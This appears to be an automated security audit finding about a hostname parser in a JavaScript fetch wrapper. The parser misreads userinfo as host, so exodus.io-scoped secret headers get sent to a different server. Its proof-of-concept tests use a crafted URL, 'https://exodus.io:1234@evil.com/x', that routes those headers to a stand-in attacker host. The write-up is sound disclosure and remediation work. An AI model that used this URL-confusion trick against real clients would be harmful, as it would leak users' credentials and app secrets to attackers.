### Title
Userinfo/port-separator confusion in `hostnameFromString` allows exodus.io-scoped secret headers to be sent to attacker-controlled host - (File: adapters/fetch-factory/src/hostname.js)

### Summary
`hostnameFromString` naively treats the first `:` after `://` as a port separator without first checking for a following `@` (userinfo separator). A URL of the form `https://exodus.io:<anything>@evil.com/...` is parsed by this function as hostname `exodus.io`, while the WHATWG URL algorithm used by real `fetch`/`Request`/`undici` implementations parses `exodus.io` as the *username* and `evil.com` as the actual network host. This causes `#buildHeaders` in `FetchFactory` to attach `EXODUS_HOST`-scoped headers to a request that is truly sent to `evil.com`.

### Finding Description
`hostnameFromString` in `adapters/fetch-factory/src/hostname.js` (lines 11-37) works as follows: it locates `://`, then looks for the first `:` in the remainder and, if found, unconditionally treats everything before it as the hostname (treating the `:` as a port separator): [1](#0-0) 

It never checks whether an `@` appears after that `:` (which per the URL spec would mean the `:...@` is a userinfo/password segment, not a port), nor does it search for the *last* `@` before the authority ends, as required by the WHATWG URL Standard that `fetch`/`Request`/`undici` implement.

For the crafted URL `https://exodus.io:1234@evil.com/x`:
- `hostnameFromString` finds the first `:` right after `exodus.io`, slices to `exodus.io`, validates it against `isValidHostname` (passes, since `exodus.io` matches the domain regex), and returns `exodus.io`.
- The real `URL`/`fetch` parser interprets `exodus.io:1234` as `username:password` and `evil.com` as the actual host that the network request is sent to.

In `FetchFactory#buildHeaders` (`adapters/fetch-factory/src/fetch-factory.js`, lines 93-120), the hostname returned by `getUrlHostname(url)` is matched against `this.headerConfigs` keys (populated via `setHeaders(headers, [EXODUS_HOST])` or `setDefaultExodusIdentifierHeaders`), and if it matches `EXODUS_HOST` (`exodus.io`), all headers configured for that host (e.g. `x-exodus-app-id`, `x-exodus-version`, `x-requested-with`, and any additional headers registered under `EXODUS_HOST` via `setHeaders`) are attached: [2](#0-1) [3](#0-2) 

The request is then dispatched via `this.fetchFn(url, options, ...)` using the original, unmodified URL string, so the real network destination is whatever the runtime `fetch` resolves it to (`evil.com`), not `exodus.io`: [4](#0-3) 

No other guard exists in `setHeaders`, `#buildHeaders`, or `create()` that validates the true resolved host against the value returned by `getUrlHostname` — the divergence is unchecked.

### Impact Explanation
Any consumer that constructs a `FetchFactory`-wrapped fetch and calls it with an attacker-influenced URL string (e.g., a dapp-provided or remotely-configured endpoint passed through to this fetch wrapper) can cause exodus.io-scoped headers — including app identifiers and any other secret/auth headers registered for `EXODUS_HOST` via `setHeaders` — to be sent to an attacker-controlled server (`evil.com` in the example) instead of the legitimate exodus.io backend. This is a secret/header exfiltration vulnerability: sensitive per-host headers leak to attacker infrastructure due to the parsing mismatch between `hostnameFromString` and the actual WHATWG URL parsing performed by `fetch`/`Request`/`undici`.

### Likelihood Explanation
Exploitability depends entirely on whether an untrusted/attacker-influenced string can reach `create()`'s returned fetch function as the URL argument (e.g., a dapp-configurable API endpoint, remote config value, or deeplink-derived URL passed into a `fetch-factory`-wrapped client). Given that codebase, `fetch-factory` is a shared adapter used across features (`analytics`, `assets-feature`, `geolocation`, `nfts`, headless SDK adapters, etc.), the precondition of "attacker controls URL passed to this fetch" needs to be true for the specific call site. Where satisfied, the exploit is deterministic and repeatable — no race conditions, no privileged state needed, just a single crafted URL string.

### Recommendation
Replace the hand-rolled `hostnameFromString` parser with the platform `URL` constructor (`new URL(url).hostname`), which correctly implements the WHATWG URL Standard (including userinfo/port/backslash normalization), guaranteeing the extracted hostname always matches what `fetch`/`Request`/`undici` will actually resolve as the network target. If custom parsing must be kept, it must at minimum find the *last* `@` before the first `/`, `?`, or `#` and only look for a port-separating `:` after that point.

### Proof of Concept
Differential/unit test in `adapters/fetch-factory/__tests__/hostname.test.js`:
```js
import { getUrlHostname } from '../src/hostname.js'

test('hostname parsing must match true URL resolution for userinfo-confusable URLs', () => {
  const url = 'https://exodus.io:1234@evil.com/x'
  const parsedByFactory = getUrlHostname(url)
  const trueHost = new URL(url).hostname // 'evil.com'

  expect(parsedByFactory).not.toBe(trueHost) // demonstrates the divergence
  expect(parsedByFactory).toBe('exodus.io') // factory wrongly matches EXODUS_HOST
})
```
Integration-level PoC using `FetchFactory`:
```js
const factory = new FetchFactory(mockFetchFn)
factory.setHeaders({ 'x-exodus-app-id': 'secret-app-id' }, [EXODUS_HOST])
const fetch = factory.create()
await fetch('https://exodus.io:1234@evil.com/x')
// assert mockFetchFn was called with headers containing 'x-exodus-app-id'
// while the real network target (as resolved by `new URL(...)`) is 'evil.com'
expect(mockFetchFn.mock.calls[0][1].headers.get('x-exodus-app-id')).toBe('secret-app-id')
expect(new URL(mockFetchFn.mock.calls[0][0]).hostname).toBe('evil.com')
```
A fuzz/invariant test iterating over adversarial URL corpora (embedded credentials, multiple `@`, backslashes) should assert `getUrlHostname(url) === new URL(url).hostname` for every input accepted (non-null) by `isValidHostname`; the above case is a concrete counterexample proving the invariant is violated.
